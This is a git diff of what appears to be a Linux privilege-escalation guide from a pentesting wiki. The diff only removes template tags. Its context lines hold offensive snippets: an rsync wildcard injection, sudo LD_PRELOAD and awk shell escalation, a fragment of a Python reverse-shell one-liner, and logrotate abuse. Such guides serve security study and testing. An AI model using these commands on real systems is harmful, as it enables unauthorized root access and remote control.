@@ -169,9 +169,9 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 If you are inside a docker container you can try to escape from it:
 
-{% content-ref url="docker-breakout/" %}
+
 [docker-breakout](docker-breakout/)
-{% endcontent-ref %}
+
 
 ## Drives
 
@@ -210,9 +210,9 @@ rpm -qa #Centos
 
 If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
 
-{% hint style="info" %}
+
 _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
-{% endhint %}
+
 
 ## Processes
 
@@ -237,7 +237,7 @@ Some services of a server save **credentials in clear text inside the memory**.\
 Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
 However, remember that **as a regular user you can read the memory of the processes you own**.
 
-{% hint style="warning" %}
+
 Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
 
 The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of ptrace:
@@ -246,7 +246,7 @@ The file _**/proc/sys/kernel/yama/ptrace\_scope**_ controls the accessibility of
 * **kernel.yama.ptrace\_scope = 1**: only a parent process can be debugged.
 * **kernel.yama.ptrace\_scope = 2**: Only admin can use ptrace, as it required CAP\_SYS\_PTRACE capability.
 * **kernel.yama.ptrace\_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
-{% endhint %}
+
 
 #### GDB
 
@@ -425,9 +425,9 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 
 Read the following page for more wildcard exploitation tricks:
 
-{% content-ref url="wildcards-spare-tricks.md" %}
+
 [wildcards-spare-tricks.md](wildcards-spare-tricks.md)
-{% endcontent-ref %}
+
 
 ### Cron script overwriting and symlink
 
@@ -578,9 +578,9 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 **Exploitation example:**
 
-{% content-ref url="socket-command-injection.md" %}
+
 [socket-command-injection.md](socket-command-injection.md)
-{% endcontent-ref %}
+
 
 ### HTTP sockets
 
@@ -642,25 +642,25 @@ Note that if you have write permissions over the docker socket because you are *
 
 Check **more ways to break out from docker or abuse it to escalate privileges** in:
 
-{% content-ref url="docker-breakout/" %}
+
 [docker-breakout](docker-breakout/)
-{% endcontent-ref %}
+
 
 ## Containerd (ctr) privilege escalation
 
 If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-{% content-ref url="containerd-ctr-privilege-escalation.md" %}
+
 [containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
-{% endcontent-ref %}
+
 
 ## **RunC** privilege escalation
 
 If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:
 
-{% content-ref url="runc-privilege-escalation.md" %}
+
 [runc-privilege-escalation.md](runc-privilege-escalation.md)
-{% endcontent-ref %}
+
 
 ## **D-Bus**
 
@@ -688,9 +688,9 @@ Policies to the context "default" affects everyone not affected by other policie
 
 **Learn how to enumerate and exploit a D-Bus communication here:**
 
-{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
+
 [d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
-{% endcontent-ref %}
+
 
 ## **Network**
 
@@ -775,9 +775,9 @@ Some Linux versions were affected by a bug that allows users with **UID > INT\_M
 
 Check if you are a **member of some group** that could grant you root privileges:
 
-{% content-ref url="interesting-groups-linux-pe/" %}
+
 [interesting-groups-linux-pe](interesting-groups-linux-pe/)
-{% endcontent-ref %}
+
 
 ### Clipboard
 
@@ -957,9 +957,9 @@ Finally, **escalate privileges** running
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 
-{% hint style="danger" %}
+
 A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
-{% endhint %}
+
 
 ```c
 #include <stdio.h>
@@ -1058,7 +1058,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 > strace -o /dev/null /bin/sh\
 > sudo awk 'BEGIN {system("/bin/sh")}'
 
-{% embed url="https://gtfobins.github.io/" %}
+
 
 ### FallOfSudo
 
@@ -1161,9 +1161,9 @@ That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be 
 If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
 Take a look at **how to exploit this misconfiguration** in the following page:
 
-{% content-ref url="ld.so.conf-example.md" %}
+
 [ld.so.conf-example.md](ld.so.conf-example.md)
-{% endcontent-ref %}
+
 
 ### RPATH
 
@@ -1209,9 +1209,9 @@ int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp
 Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
 Read the following page to **learn more about capabilities and how to abuse them**:
 
-{% content-ref url="linux-capabilities.md" %}
+
 [linux-capabilities.md](linux-capabilities.md)
-{% endcontent-ref %}
+
 
 ## Directory permissions
 
@@ -1537,9 +1537,9 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 There is a vulnerability on `logrotate` that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate` write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.\
 So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart from _/var/log_ are more files being **rotated**.
 
-{% hint style="info" %}
+
 This vulnerability affects `logrotate` version `3.18.0` and older
-{% endhint %}
+
 
 More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
 
@@ -1581,21 +1581,21 @@ Files that ship in packages downloaded from the distribution repository go into 
 
 ### NFS Privilege escalation
 
-{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
+
 [nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
-{% endcontent-ref %}
+
 
 ### Escaping from restricted Shells
 
-{% content-ref url="escaping-from-limited-bash.md" %}
+
 [escaping-from-limited-bash.md](escaping-from-limited-bash.md)
-{% endcontent-ref %}
+
 
 ### Cisco - vmanage
 
-{% content-ref url="cisco-vmanage.md" %}
+
 [cisco-vmanage.md](cisco-vmanage.md)
-{% endcontent-ref %}
+
 
 ## Kernel Security Protections
 
